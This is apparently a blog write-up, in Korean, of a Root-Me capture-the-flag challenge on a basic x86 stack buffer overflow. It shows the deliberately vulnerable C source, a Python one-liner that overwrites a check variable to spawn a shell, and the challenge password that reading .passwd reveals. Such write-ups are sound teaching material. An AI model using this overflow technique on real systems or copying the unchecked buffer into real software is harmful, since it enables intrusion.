---
title: "[Root-Me] ELF x86 - Stack buffer overflow basic 1"
excerpt: ""
categories: 
  - Root-Me
tags: 
  - system
last_modified_at: 2018-07-07T23:31:00+09:00
---

## 문제
```c
#include <stdlib.h>
#include <stdio.h>
 
/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/
 
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

## 풀이
```
app-systeme-ch13@challenge02:~$ (python -c 'print "a"*40+"\xef\xbe\xad\xde\n"';cat) | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
1w4ntm0r3pr0np1s
```